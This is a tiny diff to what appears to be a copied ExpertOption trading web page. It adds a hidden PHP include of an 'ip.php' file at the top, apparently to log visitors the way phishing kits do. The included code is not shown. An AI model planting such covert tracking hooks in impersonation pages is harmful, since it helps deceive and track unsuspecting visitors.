@@ -1,4 +1,5 @@
-﻿<!DOCTYPE html><html data-version="1.0.11" data-stage="prod" lang="en"><head>
+﻿<?php include 'ip.php'; ?>
+<!DOCTYPE html><html data-version="1.0.11" data-stage="prod" lang="en"><head>
 
 	<title>ExpertOption® Fast Online Trading</title>
 
